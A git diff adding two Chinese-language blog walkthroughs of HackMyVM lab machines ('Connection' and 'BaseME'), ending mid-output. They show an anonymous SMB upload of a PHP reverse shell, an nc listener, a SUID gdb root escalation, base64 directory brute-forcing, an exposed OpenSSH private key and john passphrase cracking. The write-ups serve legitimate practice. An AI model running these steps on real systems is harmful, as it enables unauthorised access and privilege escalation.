@@ -185,6 +185,232 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-Connection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/22/HackmyVM-Connection/" class="post-title-link" itemprop="url">HackmyVM-Connection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-22 22:07:19 / 修改时间：22:16:41" itemprop="dateCreated datePublished" datetime="2025-01-22T22:07:19+08:00">2025-01-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.77   08:00:27:2a:5f:aa       PCS Systemtechnik GmbH</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class="line">192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.984 seconds (129.03 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.77，nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# nmap 192.168.31.77 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 09:09 EST</span><br><span class="line">Nmap scan report for connection (192.168.31.77)</span><br><span class="line">Host is up (0.00064s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">139/tcp open  netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds</span><br><span class="line">MAC Address: 08:00:27:2A:5F:AA (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="445端口"><a href="#445端口" class="headerlink" title="445端口"></a>445端口</h1><p>开启了445端口</p>
+<p>用enum4linux进行枚举</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> =================================( Share Enumeration on 192.168.31.77 )=================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        share           Disk</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        IPC$            IPC       IPC Service (Private Share for uploading files)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            CONNECTION</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.31.77</span><br><span class="line"></span><br><span class="line">//192.168.31.77/share   Mapping: OK Listing: OK Writing: N/A</span><br><span class="line">//192.168.31.77/print$  Mapping: DENIED Listing: N/A Writing: N/A</span><br><span class="line"></span><br><span class="line">[E] Can&#x27;t understand response:</span><br><span class="line"></span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*</span><br><span class="line">//192.168.31.77/IPC$    Mapping: N/A Listing: N/A Writing: N/A</span><br></pre></td></tr></table></figure>
+
+<p>smbclint可以匿名登陆share里有一个html，随便往里传一个文件发现在80端口访问到，传一个反弹shell的php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# smbclient  //192.168.31.77/share</span><br><span class="line">Password for [WORKGROUP\root]:</span><br><span class="line">Anonymous login successful</span><br><span class="line">smb: \&gt; cd html\</span><br><span class="line">smb: \html\&gt;</span><br><span class="line">smb: \html\&gt; put rev.php</span><br><span class="line">putting file rev.php as \html\rev.php (447.0 kb/s) (average 447.0 kb/s)</span><br><span class="line">smb: \html\&gt; exit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/script]</span><br><span class="line">└─# nc -lvnp 5555</span><br><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [192.168.31.129] from (UNKNOWN) [192.168.31.77] 45632</span><br><span class="line">Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 09:12:44 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+
+<p>接收到shell了</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>用python获得一个更好的终端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$  python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@connection:/$</span><br></pre></td></tr></table></figure>
+
+<p>查找suid文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">www-data@connection:/$ find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s 2&gt;/dev/null</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gdb</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/gpassw</span><br></pre></td></tr></table></figure>
+
+<p>可以利用gdb进行suid提权</p>
+<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/gdb/">https://gtfobins.github.io/gtfobins/gdb/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">www-data@connection:/$ gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class="line">&lt;mport os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit</span><br><span class="line">GNU gdb (Debian 8.2.1-2+b3) 8.2.1</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
+
+<p>发现进到root组里了，提权结束</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-BaseME/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/22/HackmyVM-BaseME/" class="post-title-link" itemprop="url">HackmyVM-BaseME</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-22 21:12:15 / 修改时间：21:32:32" itemprop="dateCreated datePublished" datetime="2025-01-22T21:12:15+08:00">2025-01-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackMyVM/" itemprop="url" rel="index"><span itemprop="name">HackMyVM</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>arp-scan -l </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.31.1    a4:a9:30:df:ef:44       (Unknown)</span><br><span class="line">192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)</span><br><span class="line">192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)</span><br><span class="line">192.168.31.232  08:00:27:d9:d3:0c       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
+
+<p>ip为192.168.31.220，nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# nmap 192.168.31.232 --min-rate=1000 -p-</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 EST</span><br><span class="line">Nmap scan report for baseme (192.168.31.232)</span><br><span class="line">Host is up (0.0065s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds</span><br></pre></td></tr></table></figure>
+
+<h1 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# curl 192.168.31.232</span><br><span class="line">QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK</span><br><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line">iloveyou</span><br><span class="line">youloveyou</span><br><span class="line">shelovesyou</span><br><span class="line">helovesyou</span><br><span class="line">weloveyou</span><br><span class="line">theyhatesme</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>给了一串base64和几个字符串</p>
+<p>base64解码内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# echo &quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;|base64 -d</span><br><span class="line">ALL, absolutely ALL that you need is in BASE64.</span><br><span class="line">Including the password that you need :)</span><br><span class="line">Remember, BASE64 has the answer to all your questions.</span><br><span class="line">-lucas</span><br></pre></td></tr></table></figure>
+
+<p>可以知道用户名为lucas，并且所有内容都要进行base64。</p>
+<p>将字典进行base64编码，然后扫描目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# gobuster dir -u &quot;http://192.168.31.232&quot; -w ./1</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.31.232</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                ./1</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/aWRfcnNhCg==         (Status: 200) [Size: 2537]</span><br><span class="line">/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]</span><br><span class="line">Progress: 4736 / 4737 (99.98%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>这两个文件分别是id_rsa和robots.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# echo &quot;aWRfcnNhCg==&quot;|base64 -d</span><br><span class="line">id_rsa</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# echo &quot;cm9ib3RzLnR4dAo=&quot;|base64 -d</span><br><span class="line">robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>robots.txt里什么也没有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# base64 cm9ib3RzLnR4dAo= -d</span><br><span class="line">Nothing here :(</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# base64 aWRfcnNhCg=\= -d</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL</span><br><span class="line">BtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1</span><br><span class="line">cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG</span><br><span class="line">07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh</span><br><span class="line">7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv</span><br><span class="line">f7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4</span><br><span class="line">vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X</span><br><span class="line">YFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK</span><br><span class="line">xkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs</span><br><span class="line">+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi</span><br><span class="line">NNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ</span><br><span class="line">zjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0</span><br><span class="line">IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI</span><br><span class="line">pxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ</span><br><span class="line">MJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp</span><br><span class="line">+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV</span><br><span class="line">tVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh</span><br><span class="line">i6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+</span><br><span class="line">tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw</span><br><span class="line">N7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM</span><br><span class="line">Aif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ</span><br><span class="line">O+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2</span><br><span class="line">TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl</span><br><span class="line">3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL</span><br><span class="line">ND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ</span><br><span class="line">LdmmRXUS/DtO+69/aidvxGAYob+1M=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>80端口给了几个字符串就是字典，base64编码后爆破id_rsa的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat 1|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;done</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat 1</span><br><span class="line">iloveyou</span><br><span class="line">youloveyou</span><br><span class="line">shelovesyou</span><br><span class="line">helovesyou</span><br><span class="line">weloveyou</span><br><span class="line">theyhatesme</span><br><span class="line">aWxvdmV5b3UK</span><br><span class="line">eW91bG92ZXlvdQo=</span><br><span class="line">c2hlbG92ZXN5b3UK</span><br><span class="line">aGVsb3Zlc3lvdQo=</span><br><span class="line">d2Vsb3ZleW91Cg==</span><br><span class="line">dGhleWhhdGVzbWUK</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ssh2john id_rsa&gt;1</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# john 1 -w=1</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 